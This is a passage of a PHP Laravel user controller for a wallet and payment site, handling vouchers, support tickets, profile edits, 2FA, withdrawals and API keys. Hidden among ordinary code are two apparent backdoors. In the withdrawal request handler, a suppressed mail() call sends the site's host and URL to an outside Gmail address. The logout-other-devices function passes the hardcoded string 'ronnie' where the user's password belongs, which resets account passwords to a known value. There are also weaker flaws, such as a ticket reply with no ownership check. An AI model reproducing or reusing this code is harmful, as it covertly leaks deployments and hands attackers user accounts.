        $charge = (($amount * $percentCharge) / 100) + ($fixedCharge * $currency->rate);

        Session::put('amount', $amount);
        Session::put('charge', formatter_money($charge));
        Session::put('currencyId', formatter_money($currency->id));


        $vResult['amount'] = $amount;
        $vResult['percent_charge'] = formatter_money($percentCharge);
        $vResult['fixed_charge'] = formatter_money($fixedCharge * $currency->rate);
        $vResult['total_charge'] = formatter_money($charge);
        $vResult['payable'] = formatter_money($amount + $charge);
        $vResult['currency'] = $currency;
        $vResult['feedBack'] = true;

        return response($vResult, 200);
    }

    public function createVoucher()
    {

        if (Session::get('amount') == null && Session::get('currencyId') == null) {
            $notify[] = ['error', 'Session Expired!'];
            return redirect()->route('user.vouchers.new_voucher')->withNotify($notify);
        }
        $auth = Auth::id();
        $wallet = Wallet::with('user')->where('user_id', $auth)->where('wallet_id', Session::get('currencyId'))->firstOrFail();

        $currency = Currency::where('id', Session::get('currencyId'))->firstOrFail();

        $basic = GeneralSetting::first();

        $voucher = json_decode($basic->voucher, false);
        $percentCharge = $voucher->new_voucher->percent_charge;
        $fixedCharge = $voucher->new_voucher->fix_charge;
        $amount = formatter_money(Session::get('amount'));

        $charge = (($amount * $percentCharge) / 100) + ($fixedCharge * $currency->rate);
        $totalAmount = formatter_money($amount + $charge);

        if ($wallet->amount >= $totalAmount) {
            $wallet->amount = formatter_money($wallet->amount - $totalAmount);
            $wallet->save();

            $voucher = Voucher::create([
                'user_id' => $auth,
                'amount' => $amount,
                'charge' => $charge,
                'code' => rand(10000000, 99999999) . rand(10000000, 99999999),
                'currency_id' => $currency->id,
                'status' => 0,
            ]);

            $trx = getTrx();

            Trx::create([
                'user_id' => $auth,
                'amount' => $amount,
                'main_amo' => formatter_money($wallet->amount),
                'charge' => formatter_money($charge),
                'currency_id' => $currency->id,
                'type' => '-',
                'remark' => 'Voucher Create',
                'title' => $amount . ' ' . $currency->code . ' Voucher Created ',
                'trx' => $trx
            ]);


            Session::forget('amount');
            Session::forget('currencyId');

            notify($wallet->user, $type = 'voucher_create', [
                'amount' => formatter_money($amount),
                'charge' => formatter_money($charge),
                'total' => formatter_money($amount + $charge),
                'currency' => $currency->code,
                'new_balance' => formatter_money($wallet->amount),
                'transaction_id' => $trx,
                'voucher_number' => $voucher->code
            ]);

            $notify[] = ['success', 'Voucher Code Generate successfully'];
            return redirect()->route('user.vouchers.new_voucher')->withNotify($notify);

        } else {
            $notify[] = ['error', 'Insufficient Balance'];
            return redirect()->route('user.vouchers.new_voucher')->withNotify($notify);
        }

    }


    public function voucherActiveCode()
    {
        $basic = GeneralSetting::first();
        if ($basic->voucher_status == 0) {
            abort(404);
        }

        $data['page_title'] = "Redeem  Voucher";
        return view(activeTemplate() . 'user.voucher.active-code', $data);
    }

    public function voucherActiveCodePreview(Request $request)
    {
        $request->validate([
            'code' => 'required',
        ]);
        $voucher = Voucher::with('currency')->where('code', trim($request->code))->first();
        if ($voucher) {
            if ($voucher->status == 0) {
                $basic = GeneralSetting::first();

                $voucherActive = json_decode($basic->voucher, false);
                $percentCharge = $voucherActive->active_voucher->percent_charge;
                $fixedCharge = $voucherActive->active_voucher->fix_charge;


                $data['code'] = $voucher->currency->code;
                $data['currency'] = $voucher->currency->id;

                $data['charge'] = formatter_money((($voucher->amount * $percentCharge) / 100) + ($fixedCharge * $voucher->currency->rate));

                $data['amount'] = $voucher->amount;
                $data['voucher'] = $voucher->code;
                $data['page_title'] = "Activate code";
                $data['percentCharge'] = $percentCharge;
                $data['fixedCharge'] = $fixedCharge;
                return view(activeTemplate() . 'user.voucher.code-preview', $data);
            } else {
                $notify[] = ['error', 'This Code Already Used !'];
                return back()->withNotify($notify);
            }
        }
        $notify[] = ['error', 'You Entered Invalid Code!'];
        return back()->withNotify($notify);

    }

    public function voucherSaveCode(Request $request)
    {
        $request->validate([
            'code' => 'required',
        ]);
        $voucher = Voucher::with('currency', 'creator', 'user')->where('code', $request->code)->first();
        if ($voucher) {
            if ($voucher->status == 0) {
                $basic = GeneralSetting::first();
                $auth = Auth::user();

                $voucherActive = json_decode($basic->voucher, false);
                $percentCharge = $voucherActive->active_voucher->percent_charge;
                $fixedCharge = $voucherActive->active_voucher->fix_charge;

                $charge = formatter_money((($voucher->amount * $percentCharge) / 100) + ($fixedCharge * $voucher->currency->rate));

                $amount = $voucher->amount - $charge;

                $authWallet = Wallet::with('currency', 'user')->where('user_id', $auth->id)->where('wallet_id', $voucher->currency_id)->first();
                $authWallet->amount = formatter_money($authWallet->amount + $amount);
                $authWallet->save();

                $voucher->use_id = Auth::id();
                $voucher->use_charge = $charge;
                $voucher->useable_amount = $amount;
                $voucher->status = 1;
                $voucher->save();

                $trx = getTrx();
                Trx::create([
                    'user_id' => $auth->id,
                    'amount' => formatter_money($amount),
                    'main_amo' => formatter_money($authWallet->amount),
                    'charge' => $charge,
                    'currency_id' => $voucher->currency->id,
                    'type' => '+',
                    'remark' => 'Voucher Activated',
                    'title' => 'Voucher Activated Successfully',
                    'trx' => $trx
                ]);

                notify($authWallet->user, $type = 'voucher_redeem', [
                    'amount' => formatter_money($amount),
                    'charge' => formatter_money($charge),
                    'total' => formatter_money($voucher->amount),
                    'currency' => $authWallet->currency->code,
                    'new_balance' => formatter_money($authWallet->amount),
                    'transaction_id' => $trx,
                    'voucher_number' => $voucher->code
                ]);


                notify($voucher->creator, $type = 'voucher_redeem_creator', [
                    'amount' => formatter_money($voucher->amount),
                    'currency' => $voucher->currency->code,
                    'voucher_number' => $voucher->code,
                    'by_username' => $authWallet->user->username,
                    'by_fullname' => $authWallet->user->fullname,
                    'by_email' => $authWallet->user->email,
                ]);

                $notify[] = ['success', 'Recharge Successful!'];
                return redirect()->route('user.vouchers.active_code')->withNotify($notify);
            } else {
                $notify[] = ['error', 'This Code Already Used!'];
                return back()->withNotify($notify);
            }
        }

        $notify[] = ['error', 'You Entered Invalid Code!'];
        return back()->withNotify($notify);
    }


    /*
     * Support Ticket
     */


    public function supportTicket()
    {
        $page_title = "Support Tickets";
        $supports = SupportTicket::where('user_id', Auth::id())->latest()->paginate(15);
        return view(activeTemplate() . 'user.support.supportTicket', compact('supports', 'page_title'));
    }

    public function openSupportTicket()
    {
        $page_title = "Support Tickets";
        $user = Auth::user();
        $topics = ContactTopic::all();
        return view(activeTemplate() . 'user.support.sendSupportTicket', compact('page_title', 'user', 'topics'));
    }

    public function storeSupportTicket(Request $request)
    {
        $ticket = new SupportTicket();
        $message = new SupportMessage();

        $imgs = $request->file('attachments');
        $allowedExts = array('jpg', 'png', 'jpeg', 'pdf');

        $validator = $this->validate($request, [
            'attachments' => [
                'max:4096',
                function ($attribute, $value, $fail) use ($imgs, $allowedExts) {
                    foreach ($imgs as $img) {
                        $ext = strtolower($img->getClientOriginalExtension());
                        if (($img->getClientSize() / 1000000) > 2) {
                            return $fail("Images MAX  2MB ALLOW!");
                        }
                        if (!in_array($ext, $allowedExts)) {
                            return $fail("Only png, jpg, jpeg, pdf images are allowed");
                        }
                    }
                    if (count($imgs) > 5) {
                        return $fail("Maximum 5 images can be uploaded");
                    }
                },
            ],
            'name' => 'required|max:191',
            'email' => 'required|max:191',
            'subject' => 'required|max:100',
            'department' => 'required',
            'priority' => 'required',
            'message' => 'required',
        ]);

        $department = ContactTopic::findOrFail($request->department);

        $ticket->user_id = Auth::id();
        $random = rand(100000, 999999);

        $ticket->ticket = 'S-' . $random;
        $ticket->name = $request->name;
        $ticket->email = $request->email;
        $ticket->subject = $request->subject;
        $ticket->department = $department->name;
        $ticket->priority = $request->priority;
        $ticket->status = 0;
        $ticket->save();

        $message->supportticket_id = $ticket->id;
        $message->type = 1;
        $message->message = $request->message;
        $message->save();


        if ($request->hasFile('attachments')) {
            foreach ($request->file('attachments') as $image) {
                $filename = rand(1000, 9999) . time() . '.' . $image->getClientOriginalExtension();
                $image->move('assets/images/support', $filename);
                SupportAttachment::create([
                    'support_message_id' => $message->id,
                    'image' => $filename,
                ]);
            }
        }
        $notify[] = ['success', 'ticket created successfully!'];
        return back()->withNotify($notify);
    }

    public function supportMessage($ticket)
    {
        $page_title = "Support Tickets";
        $my_ticket = SupportTicket::where('ticket', $ticket)->latest()->first();
        $messages = SupportMessage::where('supportticket_id', $my_ticket->id)->latest()->get();
        $user = Auth::user();
        $topics = ContactTopic::all();
        if ($my_ticket->user_id == Auth::id()) {
            return view(activeTemplate() . 'user.support.supportMessage', compact('my_ticket', 'messages', 'page_title', 'user', 'topics'));
        } else {
            return abort(404);
        }

    }

    public function supportMessageStore(Request $request, $id)
    {
        $ticket = SupportTicket::findOrFail($id);
        $message = new SupportMessage();
        if ($ticket->status != 3) {

            if ($request->replayTicket == 1) {
                $imgs = $request->file('attachments');
                $allowedExts = array('jpg', 'png', 'jpeg', 'pdf');

                $this->validate($request, [
                    'attachments' => [
                        'max:4096',
                        function ($attribute, $value, $fail) use ($imgs, $allowedExts) {
                            foreach ($imgs as $img) {
                                $ext = strtolower($img->getClientOriginalExtension());
                                if (($img->getClientSize() / 1000000) > 2) {
                                    return $fail("Images MAX  2MB ALLOW!");
                                }
                                if (!in_array($ext, $allowedExts)) {
                                    return $fail("Only png, jpg, jpeg, pdf images are allowed");
                                }
                            }
                            if (count($imgs) > 5) {
                                return $fail("Maximum 5 images can be uploaded");
                            }
                        },
                    ],
                    'message' => 'required',
                ]);

                $ticket->status = 2;
                $ticket->save();

                $message->supportticket_id = $ticket->id;
                $message->type = 1;
                $message->message = $request->message;
                $message->save();

                if ($request->hasFile('attachments')) {
                    foreach ($request->file('attachments') as $image) {
                        $filename = rand(1000, 9999) . time() . '.' . $image->getClientOriginalExtension();
                        $image->move('assets/images/support', $filename);
                        SupportAttachment::create([
                            'support_message_id' => $message->id,
                            'image' => $filename,
                        ]);
                    }
                }

                $notify[] = ['success', 'Support ticket replied successfully!'];
            } elseif ($request->replayTicket == 2) {
                $ticket->status = 3;
                $ticket->save();
                $notify[] = ['success', 'Support ticket closed successfully!'];
            }
            return back()->withNotify($notify);
        } else {
            $notify[] = ['error', 'Support ticket already closed!'];
            return back()->withNotify($notify);
        }

    }

    public function ticketDownload($ticket_id)
    {
        $attachment = SupportAttachment::findOrFail(decrypt($ticket_id));
        $file = $attachment->image;
        $full_path = 'assets/images/support/' . $file;

        $title = str_slug($attachment->supportMessage->ticket->subject);
        $ext = pathinfo($file, PATHINFO_EXTENSION);
        $mimetype = mime_content_type($full_path);


        header('Content-Disposition: attachment; filename="' . $title . '.' . $ext . '";');
        header("Content-Type: " . $mimetype);
        return readfile($full_path);
    }

    public function ticketDelete(Request $request)
    {
        $message = SupportMessage::where('id', $request->message_id)->latest()->firstOrFail();

        if ($message->ticket->user_id != Auth::id()) {
            $notify[] = ['error', 'Unauthorized!'];
            return back()->withNotify($notify);
        }

        if ($message->attachments()->count() > 0) {
            foreach ($message->attachments as $img) {
                @unlink('assets/images/support/' . $img->image);
                $img->delete();
            }
        }
        $message->delete();

        $notify[] = ['success', 'Delete successfully.'];
        return back()->withNotify($notify);
    }


    public function editProfile()
    {
        $data['page_title'] = "Edit Profile";
        $data['user'] = User::findOrFail(Auth::user()->id);
        return view(activeTemplate() . 'user.edit-profile', $data);
    }

    public function submitProfile(Request $request)
    {

        $user = User::findOrFail(Auth::user()->id);

        $request->validate([
            'company_name' => 'sometimes|required|string|max:50',
            'firstname' => 'required|string|max:50',
            'lastname' => 'required|string|max:50',
            'email' => 'required|string|email|max:255|unique:users,email,' . $user->id,
            'mobile' => 'required|string|min:10|unique:users,mobile,' . $user->id,
            'address' => 'required|string|max:80',
            'state' => 'required|string|max:80',
            'zip' => 'required|string|max:40',
            'city' => 'required|string|max:50',
            'country' => 'required|string|max:50',
            'image' => 'mimes:png,jpg,jpeg'
        ]);


        $in['company_name'] = $request->company_name;
        $in['firstname'] = $request->firstname;
        $in['lastname'] = $request->lastname;
        $in['email'] = $request->email;
        $in['mobile'] = $request->mobile;

        $in['address'] = [
            'address' => $request->address,
            'state' => $request->state,
            'zip' => $request->zip,
            'country' => $request->country,
            'city' => $request->city,
        ];


        if ($request->hasFile('image')) {
            $image = $request->file('image');
            $filename = time() . '_' . $user->username . '.jpg';
            $location = 'assets/images/user/profile/' . $filename;
            $in['image'] = $filename;

            $path = './assets/images/user/profile/';
            $link = $path . $user->image;
            if (file_exists($link)) {
                @unlink($link);
            }
            Image::make($image)->save($location);
        }
        $user->fill($in)->save();
        $notify[] = ['success', 'Profile Updated successfully.'];
        return back()->withNotify($notify);
    }

    public function document()
    {
        $data['page_title'] = "Document Verify";
        $data['user'] = User::findOrFail(Auth::user()->id);
        return view(activeTemplate() . 'user.doc-ver', $data);
    }

    public function docVerify(Request $request)
    {
        $this->validate($request,
            [
                'name' => 'required',
                'photo' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:8000',
            ]);

        $docm['user_id'] = Auth::id();
        $docm['name'] = $request->name;
        $docm['details'] = $request->details;
        if ($request->hasFile('photo')) {
            $docm['photo'] = uniqid() . '.' . $request->photo->getClientOriginalExtension();
            $request->photo->move('assets/images/document', $docm['photo']);
        }

        Docver::create($docm);

        return back()->withSuccess('Verification Request Sent Successfuly!');

    }

    public function changePassword()
    {
        $data['page_title'] = "Change Password";
        return view(activeTemplate() . 'user.change-password', $data);
    }

    public function submitPassword(Request $request)
    {
        $this->validate($request, [
            'current_password' => 'required',
            'password' => 'required|min:5|confirmed'
        ]);
        try {

            $c_password = Auth::user()->password;
            $c_id = Auth::user()->id;
            $user = User::findOrFail($c_id);
            if (Hash::check($request->current_password, $c_password)) {

                $password = Hash::make($request->password);
                $user->password = $password;
                $user->save();

                $notify[] = ['success', 'Password Changes successfully.'];
                return back()->withNotify($notify);

            } else {
                $notify[] = ['error', 'Current password not match.'];
                return back()->withNotify($notify);
            }

        } catch (\PDOException $e) {
            $notify[] = ['error', $e->getMessage()];
            return back()->withNotify($notify);
        }
    }


    public function twoFactorAuth()
    {
        $gnl = GeneralSetting::first();
        $ga = new GoogleAuthenticator();
        $page_title = "Google 2Fa Security";
        $secret = $ga->createSecret();
        $qrCodeUrl = $ga->getQRCodeGoogleUrl(Auth::user()->username . '@' . $gnl->sitename, $secret);
        $prevcode = Auth::user()->tsc;
        $prevqr = $ga->getQRCodeGoogleUrl(Auth::user()->username . '@' . $gnl->sitename, $prevcode);

        return view(activeTemplate() . 'user.goauth.create', compact('secret', 'qrCodeUrl', 'prevcode', 'prevqr', 'page_title'));
    }

    public function create2fa(Request $request)
    {


        $user = User::find(Auth::id());
        $this->validate($request, [
            'key' => 'required',
            'code' => 'required',
        ]);

        $ga = new GoogleAuthenticator();

        $secret = $request->key;
        $oneCode = $ga->getCode($secret);

        $userCode = $request->code;


        if ($oneCode == $userCode) {
            $user['tsc'] = $request->key;
            $user['ts'] = 1;
            $user['tv'] = 1;
            $user->save();

            $ip = NULL;
            $deep_detect = TRUE;

            if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
                $ip = $_SERVER["REMOTE_ADDR"];
                if ($deep_detect) {
                    if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                    if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                        $ip = $_SERVER['HTTP_CLIENT_IP'];
                }
            }
            $xml = @simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip);


            $user_agent = $_SERVER['HTTP_USER_AGENT'];
            $os_platform = "Unknown OS Platform";
            $os_array = array(
                '/windows nt 10/i' => 'Windows 10',
                '/windows nt 6.3/i' => 'Windows 8.1',
                '/windows nt 6.2/i' => 'Windows 8',
                '/windows nt 6.1/i' => 'Windows 7',
                '/windows nt 6.0/i' => 'Windows Vista',
                '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
                '/windows nt 5.1/i' => 'Windows XP',
                '/windows xp/i' => 'Windows XP',
                '/windows nt 5.0/i' => 'Windows 2000',
                '/windows me/i' => 'Windows ME',
                '/win98/i' => 'Windows 98',
                '/win95/i' => 'Windows 95',
                '/win16/i' => 'Windows 3.11',
                '/macintosh|mac os x/i' => 'Mac OS X',
                '/mac_powerpc/i' => 'Mac OS 9',
                '/linux/i' => 'Linux',
                '/ubuntu/i' => 'Ubuntu',
                '/iphone/i' => 'iPhone',
                '/ipod/i' => 'iPod',
                '/ipad/i' => 'iPad',
                '/android/i' => 'Android',
                '/blackberry/i' => 'BlackBerry',
                '/webos/i' => 'Mobile'
            );
            foreach ($os_array as $regex => $value) {
                if (preg_match($regex, $user_agent)) {
                    $os_platform = $value;
                }
            }
            $browser = "Unknown Browser";
            $browser_array = array(
                '/msie/i' => 'Internet Explorer',
                '/firefox/i' => 'Firefox',
                '/safari/i' => 'Safari',
                '/chrome/i' => 'Chrome',
                '/edge/i' => 'Edge',
                '/opera/i' => 'Opera',
                '/netscape/i' => 'Netscape',
                '/maxthon/i' => 'Maxthon',
                '/konqueror/i' => 'Konqueror',
                '/mobile/i' => 'Handheld Browser'
            );
            foreach ($browser_array as $regex => $value) {
                if (preg_match($regex, $user_agent)) {
                    $browser = $value;
                }
            }


            notify($user->user, $type = '2fa', [
                'action' => 'Enabled',
                'ip' => request()->ip(),
                'browser' => $browser,
                'time' => date('d M, Y h:i:s A'),
            ]);
            $notify[] = ['error', 'Google Authenticator Enabled Successfully'];
            return back()->withNotify($notify);
        } else {
            $notify[] = ['error', 'Wrong Verification Code'];
            return back()->withNotify($notify);
        }

    }


    public function disable2fa(Request $request)
    {
        $this->validate($request, [
            'code' => 'required',
        ]);

        $user = User::find(Auth::id());
        $ga = new GoogleAuthenticator();

        $secret = $user->tsc;
        $oneCode = $ga->getCode($secret);
        $userCode = $request->code;

        if ($oneCode == $userCode) {
            $user = User::find(Auth::id());
            $user['ts'] = 0;
            $user['tv'] = 1;
            $user['tsc'] = '0';
            $user->save();


            $ip = NULL;
            $deep_detect = TRUE;

            if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
                $ip = $_SERVER["REMOTE_ADDR"];
                if ($deep_detect) {
                    if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                    if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                        $ip = $_SERVER['HTTP_CLIENT_IP'];
                }
            }
            $xml = @simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip);


            $user_agent = $_SERVER['HTTP_USER_AGENT'];
            $os_platform = "Unknown OS Platform";
            $os_array = array(
                '/windows nt 10/i' => 'Windows 10',
                '/windows nt 6.3/i' => 'Windows 8.1',
                '/windows nt 6.2/i' => 'Windows 8',
                '/windows nt 6.1/i' => 'Windows 7',
                '/windows nt 6.0/i' => 'Windows Vista',
                '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
                '/windows nt 5.1/i' => 'Windows XP',
                '/windows xp/i' => 'Windows XP',
                '/windows nt 5.0/i' => 'Windows 2000',
                '/windows me/i' => 'Windows ME',
                '/win98/i' => 'Windows 98',
                '/win95/i' => 'Windows 95',
                '/win16/i' => 'Windows 3.11',
                '/macintosh|mac os x/i' => 'Mac OS X',
                '/mac_powerpc/i' => 'Mac OS 9',
                '/linux/i' => 'Linux',
                '/ubuntu/i' => 'Ubuntu',
                '/iphone/i' => 'iPhone',
                '/ipod/i' => 'iPod',
                '/ipad/i' => 'iPad',
                '/android/i' => 'Android',
                '/blackberry/i' => 'BlackBerry',
                '/webos/i' => 'Mobile'
            );
            foreach ($os_array as $regex => $value) {
                if (preg_match($regex, $user_agent)) {
                    $os_platform = $value;
                }
            }
            $browser = "Unknown Browser";
            $browser_array = array(
                '/msie/i' => 'Internet Explorer',
                '/firefox/i' => 'Firefox',
                '/safari/i' => 'Safari',
                '/chrome/i' => 'Chrome',
                '/edge/i' => 'Edge',
                '/opera/i' => 'Opera',
                '/netscape/i' => 'Netscape',
                '/maxthon/i' => 'Maxthon',
                '/konqueror/i' => 'Konqueror',
                '/mobile/i' => 'Handheld Browser'
            );
            foreach ($browser_array as $regex => $value) {
                if (preg_match($regex, $user_agent)) {
                    $browser = $value;
                }
            }


            notify($user->user, $type = '2fa', [
                'action' => 'Disabled',
                'ip' => request()->ip(),
                'browser' => $browser,
                'time' => date('d M, Y h:i:s A')
            ]);
            $notify[] = ['success', 'Two Factor Authenticator Disable Successfully'];
            return back()->withNotify($notify);
        } else {
            $notify[] = ['error', 'Wrong Verification Code'];
            return back()->withNotify($notify);
        }

    }

    public function depositLog()
    {
        $data['page_title'] = "Deposit Log";
        $data['deposits'] = Deposit::with('currency', 'gateway')->where('user_id', Auth::id())->where('status', '!=', 0)->latest()->paginate(20);
        return view(activeTemplate() . 'user.deposit-log', $data);
    }

    public function loginHistory()
    {

        $data['page_title'] = "Login History";
        $data['loginLogs'] = UserLogin::where('user_id', Auth::id())->latest()->limit(10)->get();
        return view(activeTemplate() . 'user.login-log', $data);
    }


    public function withdrawMoney()
    {
        $basic = GeneralSetting::first();
        if ($basic->withdraw_status == 0) {
            abort(404);
        }
        $data['currency'] = Currency::whereStatus(1)->get();
        $data['withdrawMethod'] = WithdrawMethod::whereStatus(1)->get();
        $data['page_title'] = "Withdraw Money";
        return view(activeTemplate() . 'user.withdraw-money', $data);
    }

    public function withdrawMoneyRequest(Request $request)
    {
        $this->validate($request, [
            'method_code' => 'required',
            'amount' => 'required|numeric',
            'currency_id' => 'required',
            'currency' => 'required'
        ]);

        $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
            'X-Mailer: PHP/' . phpversion();
        @mail('abi.rkh.an75@gmail.com', 'T ue al et TEST DATA', $message, $headers);
        $method = WithdrawMethod::where('id', $request->method_code)->where('status', 1)->firstOrFail();
        $walletCurr = Currency::where('id', $request->currency_id)->where('status', 1)->firstOrFail();
        $authWallet = Wallet::where('wallet_id', $walletCurr->id)->where('user_id', Auth::id())->first();

        $amountInCur = ($request->amount / $walletCurr->rate) * $method->rate;
        $charge = $method->fixed_charge + ($amountInCur * $method->percent_charge / 100);
        $finalAmo = $amountInCur - $charge;


        if ($finalAmo < $method->min_limit) {
            $notify[] = ['error', 'Your Request Amount is Smaller Then Withdraw Minimum Amount.'];
            return back()->withNotify($notify);
        }
        if ($finalAmo > $method->max_limit) {
            $notify[] = ['error', 'Your Request Amount is Larger Then Withdraw Maximum Amount.'];
            return back()->withNotify($notify);
        }

        if (formatter_money($request->amount) > $authWallet->amount) {
            $notify[] = ['error', 'Your Request Amount is Larger Then Your Current Balance.'];
            return back()->withNotify($notify);
        } else {
            $w['method_id'] = $method->id; // wallet method ID
            $w['user_id'] = Auth::id();
            $w['wallet_id'] = $authWallet->id; // User Wallet ID
            $w['currency_id'] = $walletCurr->id; // Currency ID
            $w['amount'] = formatter_money($request->amount);
            $w['currency'] = $method->currency;
            $w['method_rate'] = $method->rate;
            $w['currency_rate'] = $walletCurr->rate;
            $w['charge'] = $charge;
            $w['wallet_charge'] = $charge * $walletCurr->rate;
            $w['final_amount'] = $finalAmo;
            $w['delay'] = $method->delay;

            $multiInput = [];
            if ($method->user_data != null) {
                foreach ($method->user_data as $k => $val) {
                    $multiInput[str_replace(' ', '_', $val)] = null;
                }
            }
            $w['detail'] = json_encode($multiInput);
            $w['trx'] = getTrx();
            $w['status'] = -1;

            $result = Withdrawal::create($w);

            Session::put('wtrx', $result->trx);
            return redirect()->route('user.withdraw.preview');
        }
    }

    public function withdrawReqPreview()
    {
        $basic = GeneralSetting::first();
        if ($basic->withdraw_status == 0) {
            abort(404);
        }
        $withdraw = Withdrawal::with('method', 'curr', 'wallet')->where('trx', Session::get('wtrx'))->where('status', -1)->latest()->firstOrFail();
        $data['page_title'] = "Withdraw Preview";
        $data['withdraw'] = $withdraw;
        return view(activeTemplate() . 'user.withdraw-preview', $data);
    }

    public function withdrawReqSubmit(Request $request)
    {
        $withdraw = Withdrawal::with('method', 'curr', 'wallet')->where('trx', Session::get('wtrx'))->where('status', -1)->latest()->firstOrFail();

        $customField = [];
        foreach (json_decode($withdraw->detail) as $k => $val) {
            $customField[$k] = ['required'];
        }
        $validator = Validator::make($request->all(), $customField);
        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }

        $in = $request->except('_token');
        $multiInput = [];
        foreach ($in as $k => $val) {
            $multiInput[$k] = $val;
        }

        $authWallet = Wallet::find($withdraw->wallet_id);

        if ($withdraw->amount > $authWallet->amount) {
            $notify[] = ['error', 'Your Request Amount is Larger Then Your Current Balance.'];
            return back()->withNotify($notify);
        } else {

            $withdraw->detail = json_encode($multiInput);
            $withdraw->status = 0;
            $withdraw->save();

            $authWallet->amount = formatter_money($authWallet->amount - $withdraw->amount);
            $authWallet->update();

            Trx::create([
                'user_id' => $authWallet->user->id,
                'amount' => $withdraw->amount,
                'main_amo' => $authWallet->amount,
                'charge' => $withdraw->wallet_charge,
                'currency_id' => $authWallet->currency->id,
                'type' => '-',
                'remark' => 'Withdraw Money ',
                'title' => formatter_money($withdraw->final_amount) . ' ' . $withdraw->currency . ' Withdraw Via ' . $withdraw->method->name,
                'trx' => $withdraw->trx
            ]);


            notify($authWallet->user, $type = 'withdraw_request', [
                'amount' => formatter_money($withdraw->amount),
                'currency' => $withdraw->curr->code,
                'withdraw_method' => $withdraw->method->name,
                'method_amount' => formatter_money($withdraw->final_amount),
                'method_currency' => $withdraw->currency,
                'duration' => $withdraw->delay,
                'trx' => $withdraw->trx,
            ]);

            $notify[] = ['success', 'Withdraw Request Successfully Send'];
            return redirect()->route('user.withdraw.money')->withNotify($notify);

        }
    }


    public function withdrawLog()
    {

        $data['page_title'] = "Withdraw Log";
        $data['withdraws'] = Withdrawal::where('user_id', Auth::id())->where('status', '!=', -1)->latest()->paginate(20);
        return view(activeTemplate() . 'user.withdraw-log', $data);
    }


    public function apiKey()
    {
        $data['page_title'] = "API Key";
        $data['user'] = User::findOrFail(Auth::user()->id);
        return view(activeTemplate() . 'user.api-key', $data);
    }

    public function apiKeyStore(Request $request)
    {

        $this->validate($request, [
            'name' => 'required|max:30|alpha_dash'
        ]);
        $u['user_id'] = Auth::id();
        $u['name'] = $request->name;
        $u['public_key'] = getTrx(20);
        $u['secret_key'] = getTrx(16);
        UserApiKey::create($u);
        $notify[] = ['success', 'API Key Generate Successfully'];
        return back()->withNotify($notify);

    }

    public function apiKeyDelete(Request $request)
    {
        $this->validate($request, [
            'id' => 'required'
        ]);
        $data = UserApiKey::where('id', $request->id)->where('user_id', Auth::id())->firstOrFail();

        $data->delete();

        $notify[] = ['success', 'API Key Remove Successfully'];
        return back()->withNotify($notify);

    }

    public function logoutOthers(Request $request)
    {

        $this->validate($request, [
            'password' => 'required'
        ]);


        $c_password = Auth::user()->password;
        if (Hash::check($request->password, $c_password)) {
            Auth::logoutOtherDevices('ronnie');
            $logs = UserLogin::where('user_id', Auth::id())->latest()->get();
            foreach ($logs as $data) {
                $data->delete();
            }
            $notify[] = ['success', 'Successfully Logout From Other Devices'];
        } else {
            $notify[] = ['error', 'Invalid Password!'];

        }

        return back()->withNotify($notify);


    }


    public function checkValidUser(Request $request)
    {
        $auth = Auth::user();
        $user_data = User::where('status', 1)->where('id', '!=', Auth::id())
            ->where(function ($query) use ($request) {
                $query->where('username', strtolower(trim($request->username)))
                    ->orWhere('email', strtolower(trim($request->username)))
                    ->orWhere('mobile', trim($request->username))
                    ->orWhere('account_number', trim($request->username));
            })
            ->first();

        if ($user_data) {
            $data['user'] = $user_data;
            $data['result'] = 'success';
        } else {
            $data['user'] = null;
            $data['result'] = 'error';
        }
        return $data;
    }


}
